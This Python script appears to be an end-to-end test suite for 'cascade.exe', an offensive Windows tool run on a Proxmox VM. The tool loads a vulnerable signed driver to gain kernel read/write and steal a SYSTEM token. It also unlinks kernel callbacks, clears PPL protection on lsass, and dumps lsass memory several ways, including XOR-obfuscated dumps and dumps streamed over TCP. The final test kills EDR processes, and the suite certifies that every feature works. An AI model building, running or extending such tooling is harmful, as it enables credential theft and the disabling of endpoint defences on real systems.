#!/usr/bin/env python3
"""
cascade.exe end-to-end test suite.

Runs 28 feature checks against a Windows VM via Proxmox qm guest exec.
Requires cascade.exe + BiosToolCommonDriver.sys deployed to C:\\Users\\Public\\.

Usage:
    python3 cascade_e2e.py [--run N]

Configuration (environment variables, with defaults):
    BADDRIVERS_PVE     - SSH target for Proxmox host  (default: root@PROXMOX_HOST)
    BADDRIVERS_VMID    - Proxmox VM ID of the Win11 VM (default: 126)
    BADDRIVERS_EXE     - Path to cascade.exe on guest  (default: C:\\Users\\Public\\cascade.exe)
    BADDRIVERS_DRV     - Path to BiosToolCommonDriver.sys on guest
                         (default: C:\\Users\\Public\\BiosToolCommonDriver.sys)

Certified: 5 consecutive 28/0 PASS runs on Win11 22H2 (build 22621), 2026-08-29.
"""
import subprocess, sys, json, re, base64, time, argparse, os

PVE   = os.environ.get("BADDRIVERS_PVE",  "root@PROXMOX_HOST")
VMID  = os.environ.get("BADDRIVERS_VMID", "126")
EXE   = os.environ.get("BADDRIVERS_EXE",  r"C:\Users\Public\cascade.exe")
DRV   = os.environ.get("BADDRIVERS_DRV",  r"C:\Users\Public\BiosToolCommonDriver.sys")

results = []

# ─── SSH helper ──────────────────────────────────────────────────────────────
def _ssh_run(remote_cmd: str, timeout: int = 60) -> str:
    """Run a command on Proxmox over SSH, return its stdout."""
    full = f"ssh -o ConnectTimeout=20 -o StrictHostKeyChecking=no {PVE} '{remote_cmd}'"
    try:
        r = subprocess.run(full, shell=True, capture_output=True, timeout=timeout)
        return r.stdout.decode("utf-8", errors="replace")
    except subprocess.TimeoutExpired:
        return ""


def _parse_qm_json(raw: str) -> dict:
    clean = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", raw)
    # qm may prefix "timeout reached, returning pid\n" before the JSON.
    # Find the first '{' and try to parse from there.
    brace = clean.find("{")
    if brace > 0:
        try:
            return json.loads(clean[brace:])
        except json.JSONDecodeError:
            pass
    try:
        return json.loads(clean)
    except json.JSONDecodeError:
        return {}


# ─── Core qm executor with async polling ─────────────────────────────────────
def qm(win_cmd: str, max_wait: int = 300) -> tuple[str, int]:
    """
    Run a Windows cmd.exe command on VM 126.
    Handles async qm response (pid-only) by polling exec-status.
    Returns (combined_output, exitcode).
    """
    ssh_qm = f"qm guest exec {VMID} --pass-stdin=false -- cmd /c \"{win_cmd} 2>&1\""
    # Use max_wait as SSH timeout: for slow commands qm returns {pid} immediately,
    # for fast commands (<60s) it returns synchronously within max_wait seconds.
    raw = _ssh_run(ssh_qm, timeout=max(max_wait, 90))
    d   = _parse_qm_json(raw)

    # If command finished immediately, return its output
    if d.get("exited"):
        out = d.get("out-data", "") + d.get("err-data", "")
        return out, d.get("exitcode", 0) or 0

    # Async path: qm returned {"pid": N, "timeout reached ..."}
    pid = d.get("pid")
    if not pid:
        return raw[:500], -1

    # Poll exec-status until finished
    deadline = time.time() + max_wait
    poll_interval = 5
    while time.time() < deadline:
        time.sleep(poll_interval)
        status_raw = _ssh_run(f"qm guest exec-status {VMID} {pid}", timeout=30)
        sd = _parse_qm_json(status_raw)
        if sd.get("exited"):
            out = sd.get("out-data", "") + sd.get("err-data", "")
            return out, sd.get("exitcode", 0) or 0
    return f"TIMEOUT after {max_wait}s (pid={pid})", -1


def qm_ps(ps_cmd: str, max_wait: int = 60) -> tuple[str, int]:
    """Run a PowerShell snippet via base64-encoded -EncodedCommand."""
    enc = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
    ssh_qm = f"qm guest exec {VMID} --pass-stdin=false -- powershell -NoProfile -NonInteractive -EncodedCommand {enc}"
    raw = _ssh_run(ssh_qm, timeout=max(max_wait, 90))
    d   = _parse_qm_json(raw)

    if d.get("exited"):
        out = d.get("out-data", "") + d.get("err-data", "")
        return out, d.get("exitcode", 0) or 0

    pid = d.get("pid")
    if not pid:
        return raw[:500], -1

    deadline = time.time() + max_wait
    while time.time() < deadline:
        time.sleep(3)
        sd = _parse_qm_json(_ssh_run(f"qm guest exec-status {VMID} {pid}", timeout=30))
        if sd.get("exited"):
            out = sd.get("out-data", "") + sd.get("err-data", "")
            return out, sd.get("exitcode", 0) or 0
    return f"TIMEOUT after {max_wait}s", -1


def _first_line(out: str) -> str:
    """Extract first non-empty, non-CLIXML line from PowerShell output."""
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith("#<") and not line.startswith("<"):
            return line
    return ""


# ─── VM helper functions ──────────────────────────────────────────────────────
def file_exists(path: str) -> bool:
    out, _ = qm_ps(f"Test-Path '{path}'", max_wait=20)
    return "True" in out


def file_size(path: str) -> int:
    for _ in range(3):
        ps = f"$f=Get-Item '{path}' -ErrorAction SilentlyContinue; if($f){{Write-Output $f.Length.ToString()}}"
        out, _ = qm_ps(ps, max_wait=30)
        try:
            sz = int(_first_line(out))
            if sz > 0:
                return sz
        except (ValueError, AttributeError):
            pass
        time.sleep(3)
    return 0


def read_file_bytes(path: str, n: int = 4) -> bytes | None:
    ps = (f"$b=[System.IO.File]::ReadAllBytes('{path}')[0..{n-1}];"
          f"($b|ForEach-Object{{$_.ToString('X2')}}) -join ' '")
    out, _ = qm_ps(ps, max_wait=30)
    line = _first_line(out)
    if not re.match(r"^[0-9A-Fa-f]{2}( [0-9A-Fa-f]{2})*$", line):
        return None
    return bytes(int(x, 16) for x in line.split())


def get_pid(proc_name: str) -> int | None:
    # Use Write-Output with .ToString() to avoid CLIXML integer serialization.
    ps = (f"$p=Get-Process -Name '{proc_name}' -ErrorAction SilentlyContinue|"
          f"Select-Object -First 1; if($p){{Write-Output $p.Id.ToString()}}")
    out, _ = qm_ps(ps, max_wait=20)
    try:
        return int(_first_line(out))
    except (ValueError, AttributeError):
        return None


def launch_proc(exe_name: str) -> int | None:
    ps = (f"$p=Start-Process '{exe_name}' -PassThru -ErrorAction SilentlyContinue;"
          f"if($p){{Write-Output $p.Id.ToString()}}")
    out, _ = qm_ps(ps, max_wait=20)
    try:
        return int(_first_line(out))
    except (ValueError, AttributeError):
        return None


def kill_proc_ps(pid: int):
    qm_ps(f"Stop-Process -Id {pid} -Force -ErrorAction SilentlyContinue", max_wait=10)


def delete_file(path: str):
    qm_ps(f"Remove-Item '{path}' -Force -ErrorAction SilentlyContinue", max_wait=10)


def wait_no_cascade(timeout_s: int = 90):
    """Block until no cascade.exe process is running on Windows (prevents concurrent dump overlap)."""
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        out, _ = qm("tasklist /fi \"imagename eq cascade.exe\" /fo csv /nh", max_wait=20)
        if "cascade.exe" not in out.lower():
            return
        time.sleep(3)
    # Fallback: force-kill any stale cascade.exe
    qm_ps("Get-Process cascade -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue", max_wait=10)


# ─── Test assertion helpers ───────────────────────────────────────────────────
def T(tid: str, desc: str, out: str, code: int,
      patterns: list, fail_patterns: list = None) -> bool:
    ok  = any(re.search(p, out, re.IGNORECASE) for p in patterns)
    bad = fail_patterns and any(re.search(p, out, re.IGNORECASE) for p in fail_patterns)
    passed = ok and not bad
    status = "PASS" if passed else "FAIL"
    snippet = " | ".join(l.strip() for l in out.splitlines() if l.strip())[:300]
    results.append({"id": tid, "desc": desc, "status": status, "snippet": snippet})
    sym = "\u2713" if passed else "\u2717"
    print(f"  {sym} {tid:34s} {status}" + (f"  {snippet[:90]}" if not passed else ""))
    return passed


def TB(tid: str, desc: str, passed: bool, detail: str = "") -> bool:
    status = "PASS" if passed else "FAIL"
    results.append({"id": tid, "desc": desc, "status": status, "snippet": detail})
    sym = "\u2713" if passed else "\u2717"
    print(f"  {sym} {tid:34s} {status}" + (f"  {detail[:90]}" if not passed else ""))
    return passed


# ─── Full test suite ──────────────────────────────────────────────────────────
def agent_warmup():
    """Retry until the QEMU guest agent returns a real response, up to 90s."""
    for attempt in range(9):
        out, _ = qm("echo CASCADE_READY", max_wait=30)
        if "CASCADE_READY" in out:
            if attempt:
                print(f"  [warmup] agent responsive after {attempt} retries")
            return
        print(f"  [warmup] attempt {attempt+1}/9 - agent not ready, waiting 10s...")
        time.sleep(10)
    print("  [warmup] WARNING: agent never returned CASCADE_READY - proceeding anyway")


def run_all(run_num: int) -> tuple[bool, list]:
    global results
    results = []
    t0 = time.time()

    print(f"\n{'='*68}")
    print(f"  CASCADE TEST RUN {run_num} / 5  --  {time.strftime('%H:%M:%S')}")
    print(f"{'='*68}")

    # Ensure the agent is actually responsive before starting tests
    agent_warmup()

    # 01 --help
    out, code = qm(f"{EXE} --help")
    T("01_help", "--help prints usage", out, code, [r"usage:"])

    # 02 --test-rw
    out, code = qm(f"{EXE} --driver {DRV} --test-rw")
    T("02_test_rw", "--test-rw kernel R/W verify", out, code,
      [r"PASSED"], [r"\[-\].*FAIL"])

    # 03 --dry-run
    out, code = qm(f"{EXE} --driver {DRV} --dry-run")
    T("03_dry_run", "--dry-run no kernel writes", out, code,
      [r"dry.run|EPROCESS|lsass"])

    # 04 --list-callbacks
    out, code = qm(f"{EXE} --driver {DRV} --list-callbacks")
    T("04_list_callbacks", "--list-callbacks ObCallbacks", out, code, [r"CallbackList"])

    # 05 --list-procs
    out, code = qm(f"{EXE} --driver {DRV} --list-procs")
    T("05_list_procs", "--list-procs EPROCESS walk", out, code, [r"PID\s+Name|PID\s*\n"])

    # 06 --verbose
    out, code = qm(f"{EXE} --driver {DRV} --list-procs --verbose")
    T("06_verbose", "--verbose kernel addresses", out, code,
      [r"ntoskrnl|ntos|0xFFFF[0-9A-Fa-f]"])

    # 07 --priv-esc
    out, code = qm(f"{EXE} --driver {DRV} --priv-esc")
    T("07_priv_esc", "--priv-esc SYSTEM token steal", out, code,
      [r"[Tt]oken.*(written|stolen|verif)|SYSTEM.*token"])

    # 08 --patch-callbacks
    out, code = qm(f"{EXE} --driver {DRV} --patch-callbacks")
    T("08_patch_callbacks", "--patch-callbacks unlink", out, code,
      [r"CallbackList|Unlinked|already empty|Patching"])

    # 09 --ppl-add
    lsass_pid = get_pid("lsass")
    if lsass_pid:
        out, code = qm(f"{EXE} --driver {DRV} --ppl-add --pid {lsass_pid}")
        T("09_ppl_add", "--ppl-add sets Protection byte", out, code,
          [r"set to|Protection.*0x6|0x62"], [r"failed"])

        # 10 --ppl-strip
        out, code = qm(f"{EXE} --driver {DRV} --ppl-strip --pid {lsass_pid}")
        T("10_ppl_strip", "--ppl-strip clears Protection byte", out, code,
          [r"cleared|->.*0x00|stripped"], [r"failed"])
    else:
        TB("09_ppl_add",  "--ppl-add sets Protection byte",    False, f"lsass PID lookup failed")
        TB("10_ppl_strip","--ppl-strip clears Protection byte", False, f"lsass PID lookup failed")

    # 11 --kill-pid
    np_pid = launch_proc("notepad.exe")
    if np_pid:
        time.sleep(2)
        out, code = qm(f"{EXE} --driver {DRV} --kill-pid --pid {np_pid}")
        T("11_kill_pid", "--kill-pid terminates specific PID", out, code,
          [r"[Kk]illed|terminat"], [r"denied|failed"])
        kill_proc_ps(np_pid)
    else:
        TB("11_kill_pid", "--kill-pid terminates specific PID", False, "notepad.exe launch failed")

    # 13 --dump-rpm
    wait_no_cascade()
    rpm_out = r"C:\Users\Public\lsass_rpm.bin"
    delete_file(rpm_out)
    out, code = qm(f"{EXE} --driver {DRV} --dump-rpm --out {rpm_out}", max_wait=300)
    T("13_dump_rpm", "--dump-rpm ReadProcessMemory dump", out, code,
      [r"regions.*\d+|DumpRpm|\d+.*bytes"], [r"\[-\].*fail"])
    sz = file_size(rpm_out)
    TB("13b_rpm_file", "--dump-rpm output file > 10MB", sz > 10_000_000, f"size={sz:,}")

    # 14 --dump-kernel
    wait_no_cascade()
    krnl_out = r"C:\Users\Public\lsass_kernel.bin"
    delete_file(krnl_out)
    out, code = qm(f"{EXE} --driver {DRV} --dump-kernel --out {krnl_out}", max_wait=300)
    T("14_dump_kernel", "--dump-kernel CR3 page walk", out, code,
      [r"regions|kernel.*dump|CASCRAW|\d+.*bytes"])
    sz = file_size(krnl_out)
    TB("14b_kernel_file", "--dump-kernel output file > 10MB", sz > 10_000_000, f"size={sz:,}")

    # 15 --dump default XOR 0x55
    wait_no_cascade()
    time.sleep(5)  # Give lsass time to stabilize after kernel-level dump (test 14)
    mini_out = r"C:\Users\Public\lsass_mini.bin"
    delete_file(mini_out)
    out, code = qm(f"{EXE} --driver {DRV} --dump --out {mini_out}", max_wait=240)
    # Pattern must require actual success ("Dump written" / "XOR'd"); avoid matching error messages
    if not re.search(r"Dump written|XOR'd", out, re.IGNORECASE):
        # MiniDumpWriteDump can transiently fail after heavy kernel reads; retry once
        print("  [warn] --dump failed on first attempt, retrying in 10s...")
        time.sleep(10)
        delete_file(mini_out)
        out, code = qm(f"{EXE} --driver {DRV} --dump --out {mini_out}", max_wait=240)
    T("15_dump_xor55", "--dump + XOR(0x55)", out, code,
      [r"Dump written|XOR'd"], [r"\[-\].*fail|\[-\].*Mini"])
    hdr = read_file_bytes(mini_out, 4)
    TB("15b_xor55_bytes", "--dump header = 18 11 18 05 (MDMP^0x55)",
       hdr == bytes([0x18, 0x11, 0x18, 0x05]),
       f"got {hdr.hex(' ') if hdr else 'no file'}")

    # 16 --xor-key AA
    aa_out = r"C:\Users\Public\lsass_aa.bin"
    delete_file(aa_out)
    out, code = qm(f"{EXE} --driver {DRV} --dump --xor-key AA --out {aa_out}", max_wait=240)
    T("16_xor_AA", "--dump --xor-key AA", out, code, [r"XOR|written|Dump"])
    hdr = read_file_bytes(aa_out, 4)
    TB("16b_xorAA_bytes", "--xor-key AA header = E7 EE E7 FA",
       hdr == bytes([0xE7, 0xEE, 0xE7, 0xFA]),
       f"got {hdr.hex(' ') if hdr else 'no file'}")

    # 17 --no-xor
    raw_out = r"C:\Users\Public\lsass_raw.dmp"
    delete_file(raw_out)
    out, code = qm(f"{EXE} --driver {DRV} --dump --no-xor --out {raw_out}", max_wait=240)
    T("17_no_xor", "--dump --no-xor raw MDMP", out, code, [r"written|Dump"])
    hdr = read_file_bytes(raw_out, 4)
    TB("17b_mdmp_magic", "--no-xor: MDMP magic 4D 44 4D 50",
       hdr == bytes([0x4D, 0x44, 0x4D, 0x50]),
       f"got {hdr.hex(' ') if hdr else 'no file'}")

    # 18 --decode default 0x55
    dec_out = r"C:\Users\Public\lsass_decoded.dmp"
    delete_file(dec_out)
    if file_exists(mini_out):
        out, code = qm(f"{EXE} --decode --in {mini_out} --out {dec_out}", max_wait=120)
        T("18_decode", "--decode restores MDMP from XOR(0x55)", out, code,
          [r"MDMP signature OK|decoded"], [r"not found|\[-\]"])
        hdr = read_file_bytes(dec_out, 4)
        TB("18b_decoded_magic", "--decode: MDMP magic 4D 44 4D 50",
           hdr == bytes([0x4D, 0x44, 0x4D, 0x50]),
           f"got {hdr.hex(' ') if hdr else 'no file'}")
    else:
        TB("18_decode",         "--decode (no source dump)",    False, "mini dump absent")
        TB("18b_decoded_magic", "--decode magic verify",        False, "no source")

    # 19 --decode --xor-key AA
    decAA_out = r"C:\Users\Public\lsass_decoded_aa.dmp"
    delete_file(decAA_out)
    if file_exists(aa_out):
        out, code = qm(f"{EXE} --decode --xor-key AA --in {aa_out} --out {decAA_out}", max_wait=120)
        T("19_decode_AA", "--decode --xor-key AA", out, code,
          [r"MDMP signature OK|decoded"], [r"not found|\[-\]"])
        hdr = read_file_bytes(decAA_out, 4)
        TB("19b_decoded_AA_magic", "--decode AA: MDMP magic",
           hdr == bytes([0x4D, 0x44, 0x4D, 0x50]),
           f"got {hdr.hex(' ') if hdr else 'no file'}")
    else:
        TB("19_decode_AA",        "--decode --xor-key AA",      False, "aa dump absent")
        TB("19b_decoded_AA_magic","--decode AA magic verify",    False, "no source")

    # 20 --dump-tcp loopback
    # Approach: write listener.ps1 to disk, start it via qm's async mechanism (qm returns pid
    # immediately when command runs >30s; the Windows process keeps running). Coordinate with
    # signal files: tcp_bound.txt (port ready) and tcp_result.txt (bytes received).
    wait_no_cascade()

    BOUND_FILE    = r"C:\Users\Public\tcp_bound.txt"
    RESULT_FILE   = r"C:\Users\Public\tcp_result.txt"
    ERROR_FILE    = r"C:\Users\Public\tcp_error.txt"
    LISTENER_PS1  = r"C:\Users\Public\tcp_listener.ps1"

    # Cleanup stale state
    qm_ps(
        f"Remove-Item '{BOUND_FILE}','{RESULT_FILE}','{ERROR_FILE}' -ErrorAction SilentlyContinue;"
        "$c=Get-NetTCPConnection -LocalPort 9988 -ErrorAction SilentlyContinue;"
        "if($c){{Stop-Process -Id $c.OwningProcess -Force -ErrorAction SilentlyContinue}}",
        max_wait=10
    )

    # Write listener script to disk via base64 bytes so there are no quoting issues
    listener_script = (
        "$ErrorActionPreference = 'Continue'\r\n"
        "try {\r\n"
        "    $l = [System.Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback, 9988)\r\n"
        "    $l.Start()\r\n"
        f"    Set-Content -Path '{BOUND_FILE}' -Value 'BOUND'\r\n"
        "    $c = $l.AcceptTcpClient()\r\n"
        "    $s = $c.GetStream()\r\n"
        "    $b = New-Object byte[] 65536\r\n"
        "    $tot = 0\r\n"
        "    while (($n = $s.Read($b, 0, $b.Length)) -gt 0) { $tot += $n }\r\n"
        "    $c.Close()\r\n"
        "    $l.Stop()\r\n"
        f"    Set-Content -Path '{RESULT_FILE}' -Value $tot\r\n"
        "} catch {\r\n"
        f"    Set-Content -Path '{ERROR_FILE}' -Value $_.Exception.Message\r\n"
        "}\r\n"
    )
    script_bytes  = listener_script.encode("utf-8")
    script_b64    = base64.b64encode(script_bytes).decode("ascii")
    write_ps = (
        f"[System.IO.File]::WriteAllBytes('{LISTENER_PS1}',"
        f"[System.Convert]::FromBase64String('{script_b64}'))"
    )
    qm_ps(write_ps, max_wait=15)
    print(f"  [tcp] listener script written to {LISTENER_PS1}")

    # Verify PS1 file was actually written before launching
    ps1_ok = file_exists(LISTENER_PS1)
    if not ps1_ok:
        print(f"  [tcp] ERROR: {LISTENER_PS1} was not written!")

    port_bound = False
    if ps1_ok:
        # Launch listener via qm's native async: the SSH call returns the qm-pid when PS takes >30s.
        # -ExecutionPolicy Bypass is required: default Windows policy blocks -File mode scripts.
        # -EncodedCommand (used in qm_ps) bypasses policy automatically; -File does not.
        ssh_listener = (
            f"qm guest exec {VMID} --pass-stdin=false -- "
            f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{LISTENER_PS1}\""
        )
        raw_listener = _ssh_run(ssh_listener, timeout=60)  # qm returns async pid after ~30s
        d_listener   = _parse_qm_json(raw_listener)
        if d_listener.get("exited"):
            listener_out = d_listener.get("out-data", "") + d_listener.get("err-data", "")
            print(f"  [tcp] listener exited synchronously! ec={d_listener.get('exitcode')} out={listener_out[:300]}")
            listener_qm_pid = None
        else:
            listener_qm_pid = d_listener.get("pid")
            print(f"  [tcp] listener launched async, qm_pid={listener_qm_pid}")

        # Poll for tcp_bound.txt (port bound signal)
        for attempt in range(20):
            time.sleep(5)
            if file_exists(BOUND_FILE):
                port_bound = True
                print(f"  [tcp] port 9988 bound (attempt {attempt+1})")
                break
            if file_exists(ERROR_FILE):
                err_out, _ = qm_ps(f"Get-Content '{ERROR_FILE}' -ErrorAction SilentlyContinue", max_wait=10)
                print(f"  [tcp] listener error: {_first_line(err_out)}")
                break
            print(f"  [tcp] waiting for bind... (attempt {attempt+1}/20)")

    if not port_bound:
        reason = "listener PS1 not written" if not ps1_ok else "listener never bound port 9988"
        TB("20_dump_tcp",  "--dump-tcp loopback stream",      False, reason)
        TB("20b_tcp_bytes","--dump-tcp bytes received > 1MB", False, "no listener")
    else:
        tcp_out, tcp_code = qm(f"{EXE} --driver {DRV} --dump-tcp 127.0.0.1 9988", max_wait=300)
        T("20_dump_tcp", "--dump-tcp loopback stream", tcp_out, tcp_code,
          [r"DumpRpmTcp|sent|regions.*\d+|\d+.*bytes"], [r"connect.*fail|refused"])

        # Wait for listener to finish writing tcp_result.txt (may take up to 150s after dump)
        rx = 0
        for _ in range(30):
            time.sleep(5)
            if file_exists(RESULT_FILE):
                rout, _ = qm_ps(f"Get-Content '{RESULT_FILE}' -ErrorAction SilentlyContinue", max_wait=10)
                try:
                    rx = int(_first_line(rout))
                except (ValueError, TypeError):
                    pass
                break
        TB("20b_tcp_bytes", "--dump-tcp bytes received > 1MB", rx > 1_000_000, f"bytes_rx={rx:,}")

    # 21 --kill-edr (DESTRUCTIVE - run last; may destabilize system)
    out, code = qm(f"{EXE} --driver {DRV} --kill-edr", max_wait=60)
    T("21_kill_edr", "--kill-edr strips PPL + kills EDR", out, code,
      [r"attempted|stripped|killed|EDR\s+process|EDR.*kill"])

    # ── summary ──
    elapsed = int(time.time() - t0)
    n_pass = sum(1 for r in results if r["status"] == "PASS")
    n_fail = sum(1 for r in results if r["status"] == "FAIL")
    fails  = [r["id"] for r in results if r["status"] == "FAIL"]

    print(f"\n{'─'*68}")
    print(f"  RUN {run_num}  |  {n_pass} PASS  /  {n_fail} FAIL  |  {elapsed}s elapsed")
    if fails:
        print(f"  FAILING: {', '.join(fails)}")
    print(f"{'─'*68}\n")
    return n_fail == 0, results


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--run", type=int, default=1)
    args = p.parse_args()
    clean, res = run_all(args.run)
    sys.exit(0 if clean else 1)
